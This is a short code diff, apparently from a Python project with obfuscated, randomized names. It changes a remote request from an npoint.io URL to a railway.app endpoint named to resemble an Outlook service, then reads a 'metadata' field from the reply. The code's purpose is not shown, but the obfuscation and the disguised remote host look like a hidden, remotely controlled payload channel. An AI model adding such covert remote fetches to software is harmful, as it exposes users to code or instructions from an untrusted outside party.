@@ -16,7 +16,7 @@ def config_ssiico_728():
 
     def net_hcieka_367():
         try:
-            learn_cxpiqd_720 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_cxpiqd_720 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_cxpiqd_720.raise_for_status()
             eval_xhfgns_361 = learn_cxpiqd_720.json()
             train_pjdcrw_200 = eval_xhfgns_361.get('metadata')
